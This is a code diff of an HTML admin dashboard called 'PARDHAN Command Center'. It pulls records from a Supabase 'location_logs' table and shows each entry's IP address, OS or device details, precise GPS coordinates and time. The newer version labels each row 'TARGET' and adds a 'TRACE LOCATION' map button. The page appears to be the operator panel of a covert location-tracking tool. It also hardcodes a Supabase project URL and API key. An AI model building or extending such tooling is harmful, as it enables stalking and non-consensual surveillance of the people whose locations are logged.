@@ -1,85 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PARDHAN - Admin Control Center</title>
+    <title>PARDHAN Command Center</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', sans-serif; padding: 20px; }
-        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #30363d; padding-bottom: 15px; margin-bottom: 20px; }
-        h1 { color: #f85149; margin: 0; font-size: 24px; }
-        .refresh-btn { background: #238636; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        
-        table { width: 100%; border-collapse: collapse; background: #161b22; border-radius: 8px; overflow: hidden; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #30363d; font-size: 14px; }
-        th { background: #21262d; color: #58a6ff; }
-        tr:hover { background: #1c2128; }
-        
-        .map-link { color: #2f81f7; text-decoration: none; font-weight: bold; }
-        .map-link:hover { text-decoration: underline; }
-        .ua-text { font-size: 11px; color: #8b949e; max-width: 200px; display: block; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 30px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .card { border: 1px solid #00ff41; padding: 20px; background: rgba(0,255,65,0.05); border-radius: 10px; }
+        .map-btn { background: #00ff41; color: black; border: none; padding: 10px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
+        h1 { border-bottom: 2px solid #00ff41; padding-bottom: 10px; font-size: 32px; }
     </style>
 </head>
 <body>
-
-<div class="header">
-    <h1>🚀 PARDHAN LOGS</h1>
-    <button class="refresh-btn" onclick="fetchLogs()">Refresh Data</button>
-</div>
-
-<table>
-    <thead>
-        <tr>
-            <th>Time & Date</th>
-            <th>Location (Lat, Long)</th>
-            <th>Metadata (Battery/IP)</th>
-            <th>Device Info</th>
-            <th>Action</th>
-        </tr>
-    </thead>
-    <tbody id="log-table">
-        </tbody>
-</table>
+    <h1>SYSTEM LOGS [PARDHAN-v4]</h1>
+    <div id="logs" class="grid">Loading encrypted data...</div>
 
 <script>
     const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
-    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
+    const supabase = window.supabase.createClient(SB_URL, SB_KEY);
 
-    async function fetchLogs() {
-        const tableBody = document.getElementById('log-table');
-        tableBody.innerHTML = "<tr><td colspan='5'>Loading data from PARDHAN system...</td></tr>";
-
-        const { data, error } = await supabaseClient
-            .from('location_logs')
-            .select('*')
-            .order('created_at', { ascending: false });
-
-        if (error) {
-            tableBody.innerHTML = `<tr><td colspan='5' style='color:red'>Error: ${error.message}</td></tr>`;
-            return;
-        }
-
-        tableBody.innerHTML = "";
-        data.forEach(log => {
-            const date = new Date(log.created_at).toLocaleString();
-            const row = `
-                <tr>
-                    <td>${date}</td>
-                    <td>${log.latitude.toFixed(5)}, ${log.longitude.toFixed(5)}</td>
-                    <td>${log.ip || 'N/A'}</td>
-                    <td><span class="ua-text" title="${log.user_agent}">${log.user_agent}</span></td>
-                    <td><a class="map-link" href="https://www.google.com/maps?q=${log.latitude},${log.longitude}" target="_blank">📍 View Map</a></td>
-                </tr>
-            `;
-            tableBody.innerHTML += row;
+    async function getLogs() {
+        const { data } = await supabase.from('location_logs').select('*').order('created_at', { ascending: false });
+        const cont = document.getElementById('logs');
+        cont.innerHTML = "";
+        data.forEach(l => {
+            cont.innerHTML += `
+                <div class="card">
+                    <div><b>TARGET:</b> ${l.ip}</div>
+                    <div><b>OS:</b> ${l.os_info}</div>
+                    <div><b>COORD:</b> ${l.latitude}, ${l.longitude}</div>
+                    <div><b>TIME:</b> ${new Date(l.created_at).toLocaleString()}</div>
+                    <button class="map-btn" onclick="window.open('https://www.google.com/maps?q=${l.latitude},${l.longitude}')">TRACE LOCATION</button>
+                </div>`;
         });
     }
-
-    // Initial load
-    fetchLogs();
+    getLogs();
 </script>
-
 </body>
 </html>
